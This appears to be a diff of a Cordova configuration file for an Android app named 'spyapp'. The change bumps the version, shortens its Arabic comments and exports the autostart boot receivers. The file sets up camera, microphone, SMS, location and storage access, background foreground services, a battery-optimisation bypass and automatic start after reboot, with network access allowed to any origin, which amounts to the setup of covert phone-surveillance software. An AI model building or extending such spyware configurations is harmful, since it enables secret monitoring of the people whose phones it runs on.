@@ -1,5 +1,6 @@
+
 <?xml version='1.0' encoding='utf-8'?>
-<widget id="com.spyapp.spy" version="1.0.1"
+<widget id="com.spyapp.spy" version="1.0.2"
     xmlns="http://www.w3.org/ns/widgets"
     xmlns:cdv="http://cordova.apache.org/ns/1.0">
 
@@ -8,10 +9,8 @@
     <author email="admin@spyapp.com">SpyApp Dev Team</author>
     <content src="index.html" />
 
-    <!-- السماح بجميع الاتصالات -->
     <access origin="*" />
 
-    <!-- السماح بجميع البروتوكولات -->
     <allow-intent href="http://*/*" />
     <allow-intent href="https://*/*" />
     <allow-intent href="tel:*" />
@@ -19,14 +18,13 @@
     <allow-intent href="mailto:*" />
     <allow-intent href="geo:*" />
 
-    <!-- استهداف أحدث إصدار أندرويد -->
     <preference name="android-targetSdkVersion" value="34" />
     <preference name="android-minSdkVersion" value="24" />
     <preference name="Fullscreen" value="true" />
     <preference name="Orientation" value="portrait" />
     <preference name="ScrollEnabled" value="false" />
 
-    <!-- الإضافات (Plugins) -->
+    <!-- الإضافات -->
     <plugin name="cordova-plugin-camera" />
     <plugin name="cordova-sms-plugin" />
     <plugin name="cordova-plugin-media-capture" />
@@ -41,18 +39,30 @@
     <plugin name="cordova-plugin-foreground-service" />
 
     <platform name="android">
+        <!-- إصلاح android:exported للـ Receivers -->
+        <edit-config file="app/src/main/AndroidManifest.xml" target="/manifest/application/receiver[@android:name='com.tonikorin.cordova.plugin.autostart.BootCompletedReceiver']" mode="merge">
+            <receiver android:exported="true" />
+        </edit-config>
+        <edit-config file="app/src/main/AndroidManifest.xml" target="/manifest/application/receiver[@android:name='com.tonikorin.cordova.plugin.autostart.UserPresentReceiver']" mode="merge">
+            <receiver android:exported="true" />
+        </edit-config>
+        <edit-config file="app/src/main/AndroidManifest.xml" target="/manifest/application/receiver[@android:name='com.tonikorin.cordova.plugin.autostart.PackageReplacedReceiver']" mode="merge">
+            <receiver android:exported="true" />
+        </edit-config>
+
+        <!-- بقية الأذونات -->
         <edit-config file="app/src/main/AndroidManifest.xml" mode="merge" target="/manifest">
             <manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
-                <!-- أذونات التخزين -->
+                <!-- التخزين -->
                 <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
                 <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
 
-                <!-- أذونات الموقع -->
+                <!-- الموقع -->
                 <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
                 <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
 
-                <!-- الكاميرا والميكروفون -->
+                <!-- الكاميرا والمايكروفون -->
                 <uses-permission android:name="android.permission.CAMERA" />
                 <uses-permission android:name="android.permission.RECORD_AUDIO" />
 
@@ -61,23 +71,23 @@
                 <uses-permission android:name="android.permission.RECEIVE_SMS" />
                 <uses-permission android:name="android.permission.SEND_SMS" />
 
-                <!-- أذونات الشبكة -->
+                <!-- الإنترنت -->
                 <uses-permission android:name="android.permission.INTERNET" />
                 <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 
-                <!-- منع إيقاف التطبيق عند سكون الجهاز -->
+                <!-- منع إيقاف التطبيق -->
                 <uses-permission android:name="android.permission.WAKE_LOCK" />
 
-                <!-- تشغيل التطبيق في الخلفية -->
+                <!-- تشغيل في الخلفية -->
                 <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
                 <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
                 <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
                 <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
 
-                <!-- إذن تجاهل تحسينات البطارية -->
+                <!-- تجاوز تحسينات البطارية -->
                 <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
 
-                <!-- التشغيل التلقائي عند إعادة تشغيل الجهاز -->
+                <!-- التشغيل التلقائي بعد إعادة التشغيل -->
                 <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
             </manifest>
